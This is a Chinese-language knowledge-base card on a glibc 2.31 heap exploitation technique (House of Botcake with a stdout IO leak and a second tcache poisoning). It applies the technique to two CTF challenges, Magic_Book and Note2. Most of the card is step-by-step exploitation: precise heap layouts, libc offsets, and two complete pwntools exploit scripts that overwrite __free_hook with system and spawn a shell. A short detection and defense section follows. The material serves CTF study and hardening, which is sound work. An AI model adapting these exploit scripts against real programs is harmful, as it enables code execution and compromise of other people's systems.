---
id: binary-pwn-heap-house-of-botcake-second-poisoning-io-leak-freehook
title: House of Botcake 无 edit/show 实战：stdout IO leak 后借 unsorted 切割布置第二条 tcache 链，二次投毒打 __free_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-botcake-second-poisoning-io-leak-freehook
tags:
- pwn
- heap
- glibc-2.31
- tcache
- double-free
- unsorted-bin
- io-leak
- free-hook
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V650
  verified_at: '2026-11-13T05:12:54+08:00'
  notes: '已对照原文与全部16图核对：Magic_Book 保护全开/无 edit-show/一次性 UAF/size<=0x100（正文）；chunk0+1 合并 0x220（图3）、botcake 后 tcache 0x110 链头为 victim（图4）、add(0x90,\xa0\x46) 切在 victim 地址使其 user+0 被 bin fd 覆盖并改写低16位为 stdout（图5: 链为 victim→_IO_2_1_stdout_→0xfbad2887；图6: 0xa0 块 fd=0x7f..46a0）、篡改 0x70 残块为 0x180 且预置 fake next chunk(prev_size=0x180/size=0x90) 通过 unsorted 校验（图7/8/12）、两次 add(0x100) 分别返回 victim 与 stdout 并 IO leak 得 libc=leak-0x1ec980（图9 实测 base 0x7f61d54d7000）、delete(12);delete(2) 组 0x90 链 [2]（图10）、add(0xb0) 切 0xc0 覆盖 freed 0x90 chunk 的 fd=free_hook（图12 内存 4c0=0x7feab94b5e48）、add(0x80) 取 /bin/sh、add(0x80) 写 __free_hook=system（图14）、delete(17) getshell（图15）；Note2 偏移 0x1ecbe0/0x1eee48/0x52290 与 exp 一致（图16 getshell）。修正：细化 IO leak 两刀机制（第一次 malloc 取 victim 篡改残块、第二次才返回 stdout）与 step1 fake next chunk 用途表述，修正繁体错字。dedup：与 binary-pwn-heap-house-of-botcake-tcache-poison（有 edit/直接 UAF 改 next）及 fastbin-stash 卡触发条件与投毒路径不同，非同一利用链，保留。未设 affected_versions：原文未显式给版本区间（2.29-2.31 为按 key 机制与偏移推断）；frontmatter 无 sources/source_url。'
url: /docs/binary/pwn/heap/binary-pwn-heap-house-of-botcake-second-poisoning-io-leak-freehook/
draft: false
kb_aliases:
- house of botcake
- botcake 二次投毒
- tcache key 绕过
- 无 show 堆题 IO leak
- unsorted bin 切割控制 tcache fd
- Magic_Book
- Note2
---

## 一句话结论

glibc 2.29+ 的 tcache key 使直接 double free 会被 `free(): double free detected in tcache 2` 拦下；先用 House of Botcake（tcache 填满 → victim 先进 unsorted bin → 释放相邻块合并 → 腾槽后再 free victim）绕过 key 检查，让同一 chunk 同时存在于 tcache 与 unsorted 合并块中；在无 edit/show、仅一次性 UAF 的题里，还能进一步用 unsorted bin 切割残留的 libc 指针做 stdout IO leak（`_flags=0xfbad1887`）泄露 libc，再准备一条 0x80/0x90 尺寸的第二 tcache 链、借 0xb0 切割把 fd 精确落到 `__free_hook`，写入 `system` 并 free 含 `"/bin/sh"` 的块完成 getshell。

## 原理

- **tcache key 机制（glibc 2.29+）**：`tcache_put` 会把 `e->key` 写成当前 tcache 指针。`_int_free` 发现 `e->key == tcache` 时遍历该 bin 链表，真遇到同一 entry 就 `malloc_printerr("free(): double free detected in tcache 2")`。直接 free 同一块两次会被拦截。
- **House of Botcake 绕过**：先把目标 size 的 tcache 填满（7 个），再 free victim `A`，它因 tcache 满进入 unsorted bin（**不写 key**）；随后 free 与 `A` 相邻的前块 `prev`，两者合并成大 unsorted 块，`A` 用户区被 unsorted 的 `fd/bk` 等元数据覆盖，`key != tcache`；从 tcache 取走一个块腾出槽位，再次 `free(A)` 时 key 检查通过，`A` 被 `tcache_put` 进 tcache —— 同一块同时属于 tcache 链和 unsorted 合并块，形成错位视图。
- **为什么要“二次投毒”布局**：tcache poisoning 需要改写 freed chunk 的 `next`。多数无 edit/show 题目只有一次性 UAF free，无法直接写 `next`；而且第一次投毒（例如把 0x100 链指向 stdout 做 IO leak）往往会破坏该 size 的 tcache 链，无法在同一链上继续。可行做法是**另备一条不同 size 的 tcache 链**（本文 0x80/0x90），再利用 unsorted bin 切割：从大 unsorted 块切出 0xb0 时，写入的超长内容会覆盖某条 freed tcache 链的 `fd`，从而把它精确改到 `__free_hook`。
- **无 show 的 libc 泄露（IO leak）**：botcake 的 victim A 在进入 unsorted/smallbin 时，user+0/+8 已被分配器写成 `fd/bk`（main_arena 指针）；从合并 unsorted 块切出 0xa0 的一刀正好落在 A 的地址上，向该块写 2 字节 `\xa0\x46` 即把 A user+0 处的 libc 指针低 16 位改成 `_IO_2_1_stdout_`（本例目标 libc 的 0x…46a0）。A 同时仍是 tcache 0x110 链的头节点，于是链的第二项变为 stdout；随后两次 `malloc(0x100)`：第一次返回被重叠的 A，用于篡改相邻 unsorted 残块头并推进链，第二次直接返回 stdout，向 `_IO_FILE` 头写入 `_flags = 0xfbad1887` 并清零读指针/写基址，下一次输出时 `[write_base, write_ptr)` 窗口覆盖 libc 内存，从返回字节算 libc 基址（本例泄露偏移 0x1ec980）。
- **为什么成立**：botcake 只解决“让 chunk 重新进 tcache”，本身不给任意写；真正的写原语来自 unsorted-bin 切割落在 tcache entry 的 `next/key` 字段上（glibc 2.31 的 tcache `next` 无 safe-linking 编码，可直接写成明文地址），因此一条链做泄露、另一条链做 hook 覆写即可。
- **版本边界**：2.31 无 safe-linking，`next` 可明文写；2.32+ 需按 `(addr>>12) ^ next` 编码并先泄堆地址；key 的随机化/检查增强（2.32+ 随机 tcache_key）会改变绕过细节。

## 触发条件

- glibc 2.29–2.31 类环境（有 tcache key，无 safe-linking 最省事）。
- 程序存在至少两次 free 的 UAF/悬空指针（本文两例：一次性 UAF free 入口 + 常规 delete 不置空）。
- 目标 size 的 tcache 可填满（7 个），且 victim 与 prev 相邻、victim 后方有已分配块防止与 top 合并。
- 无 show 时需能用部分覆写把某条 tcache 链 fd 指向 stdout（或已有其他 libc 泄露手段）；已知目标 libc 偏移。
- 有可写 BSS/堆空间承载 `"/bin/sh"`，或能 malloc 一块写字符串。

## 利用步骤

（Magic_Book：Full RELRO/PIE/Canary/NX，无 edit/show，只有一次 UAF free 机会，size ≤ 0x100）

1. 布局：`add(0x100)` 两块作为 prev/victim；`add(0x80)` 一块（预留第二条 0x80 tcache 链）；再 `add(0x100)` 并在其 user+0x70 处预置伪造的 `prev_size=0x180 / size=0x90`——这段数据落在该块尾部，正好充当后续被篡改为 0x180 的 unsorted 残块在 `+0x180` 处的 fake next chunk 头，使 unsorted 的尺寸/`prev_size(next)==size` 校验能通过。
2. 再申请 6 个 0x100 块；依次 delete 这些块把 0x110 tcache 填满；`uaf(1)` 释放 victim1（进 unsorted），`delete(0)` 释放 prev0，与 victim1 合并成大 unsorted 块。
3. `add(0x100)` 从 tcache 取一块腾出槽位；`delete(1)` 再次 free victim1，key 已被合并元数据覆盖，成功进入 tcache（botcake 完成）。
4. 依次 `add(0x70)`、`add(0x80)`、`add(0x90, b"\xa0\x46")`：从合并 unsorted 块按 0x80/0x90/0xa0 切割；第三刀 0xa0 正好落在已进入 tcache 的 victim A 地址上，此时 A 的 user+0 已被分配器的 bin `fd` 覆盖，写入这 2 字节即把该 libc 指针低 16 位改成 `_IO_2_1_stdout_`。
5. `add(0x100, ...)` 把剩余 unsorted 块 size 篡改为 0x180；再 `add(0x100, p64(0xfbad1887)+p64(0)*3+b"\x00")`：malloc 返回 stdout 并改写 `_IO_FILE` 头，触发 IO leak 得 libc 基址（本例泄露 - 0x1ec980）。
6. `delete(12); delete(2)`：腾出/组织第二条 0x80（0x90 chunk）tcache 链（0x100 链已在第一次投毒后损坏，不再使用）。
7. `add(0xb0, p64(0xdeadbeef)*12 + p64(0x70) + p64(0x90) + p64(free_hook))`：从 unsorted 继续切割 0xb0，超长写入覆盖 0x80 链 freed chunk 的 `fd`，把下一次分配指向 `__free_hook`。
8. `add(0x80, b"/bin/sh\x00")` 取回被投毒块，`add(0x80, p64(system))` 返回 `__free_hook` 并写入 `system`；`delete(含 /bin/sh 的块)` → `system("/bin/sh")`。

（Note2 简化版：常规菜单题无 edit，`op_free` 不置空；先 free 7 个 0x100 填 tcache、free(1) 进 unsorted 后 `show(1)` 读 unsorted fd 泄 libc（-0x1ecbe0），free(0) 合并后取块腾槽、再次 free(1) 进 tcache；再用 0x70/0x80/0x90 切割并把 `free_hook` 写进 tcache fd，`add(0x100)` 两次分别拿到 `"/bin/sh"` 块与 `__free_hook` 写入 `system`，最后 free 前者。）

## PoC

以下为两例的核心片段（地址/偏移均为原文 libc，需按目标核对；Note2 用 `libc.symbols` 更稳）：

```python
# Magic_Book（无 edit/show，一次 UAF free）
add(0x100, b'a')          # chunk0 prev
add(0x100, b'b')          # chunk1 victim
add(0x80,  b'c')          # 预留第二条 tcache 链
add(0x100, p64(0xdeadbeef)*14 + p64(0x180) + p64(0x90))  # 伪造 prev_size/size
for _ in range(6): add(0x100, b'a')
for i in range(3, 10): delete(i)   # 填满 tcache
uaf(1)                             # victim 进 unsorted
delete(0)                          # 与 prev 合并
add(0x100, b'a')                   # 腾槽
delete(1)                          # botcake: 再次 free 进 tcache

add(0x70, b'a')
add(0x80, b'a')
add(0x90, b'\xa0\x46')             # 部分覆写残留 libc 指针 -> stdout
add(0x100, p64(0xdeadbeef)*18 + p64(0) + p64(0x180))  # 篡改 unsorted size
add(0x100, p64(0xfbad1887) + p64(0)*3 + b'\x00')      # IO leak
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
free_hook = libc_base + libc.symbols['__free_hook']

delete(12); delete(2)              # 组织第二条 0x80 tcache 链
add(0xb0, p64(0xdeadbeef)*12 + p64(0x70) + p64(0x90) + p64(free_hook))
add(0x80, b'/bin/sh\x00')
add(0x80, p64(libc_base + libc.symbols['system']))
delete(17)                         # free_hook("/bin/sh") -> system
```

```python
# Note2（有 show 泄 unsorted，无 edit）
add(0, 0x100, b'aaa'); add(1, 0x100, b'bbb')
for i in range(2, 9): add(i, 0x100, b'eee')
for i in range(2, 9): delete(i)    # 填满 tcache
delete(1); show(1)                 # unsorted fd 泄 libc
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecbe0
free_hook = libc_base + 0x1eee48   # 原文硬编码，建议改用 libc.symbols
system = libc_base + 0x52290
delete(0)                          # 与 victim 合并
add(2, 0x100, b'tcache')
delete(1)                          # botcake 二次 free
add(3, 0x70, b'111'); add(4, 0x80, b'222'); add(5, 0x90, p64(free_hook))
add(6, 0x100, b'/bin/sh\x00')
add(7, 0x100, p64(system))
delete(6)                          # system("/bin/sh")
```

原文两题均在本地 getshell（截图显示 `ls` 成功、`__free_hook → system`）。

## 变体与关联

- 基础卡：`binary-pwn-heap-house-of-botcake-tcache-poison`（botcake 原理与 0x180/stdout 版本）；高版本 glibc 变体：`binary-pwn-heap-glibc235-botcake-malloc-consolidate-io-list-all-apple2`（2.35 走 `_IO_list_all` + House of Apple2）。
- 本卡差异点：无 edit/show、一次性 UAF 的题需用 **IO leak + 第二条 0x80/0x90 tcache 链 + unsorted 切割控制 fd**，而不是直接 UAF 改 `next`。
- 关联：stdout 部分覆写泄露见 `binary-pwn-heap-stdout-partial-overwrite-libc-leak`；`__free_hook→system` 尾链见 `binary-pwn-heap-glibc231-fastbin-stash-tcache-freehook-system`；tcache key 相关见 `binary-pwn-heap-glibc231-tcache-key-clear-repeated-free-freehook`。
- 变体：有 show 时直接用 unsorted fd 泄 libc（Note2）；有 edit 时无需二次链，直接改 fd；2.32+ 需 safe-linking 编码；2.34+ 无 `__free_hook` 时尾链改 FSOP/栈 ROP。

## 检测与防御

- 代码层：free 后置空指针并用状态位/引用计数校验；禁止对同一索引重复 free；对 size 上限的限制不能替代 UAF 修复。
- 分配器层：升级 glibc（safe-linking、随机 tcache key）可提高门槛；启用 `MALLOC_CHECK_`/ASAN/Scudo 检测重叠与非法 fd。
- 检测信号：同一 chunk 同时出现在 tcache 与 unsorted bin；tcache `fd` 指向 libc（stdout/hook）；`_IO_2_1_stdout_` 的 `_flags` 被改为 `0xfbad1887/0xfbad1800`；一次 free 序列后出现越界分配。
- 防御边界：Full RELRO/PIE/Canary/NX 全开仍挡不住本链（不依赖 GOT 覆盖），必须从 UAF 原语与 allocator 加固入手。
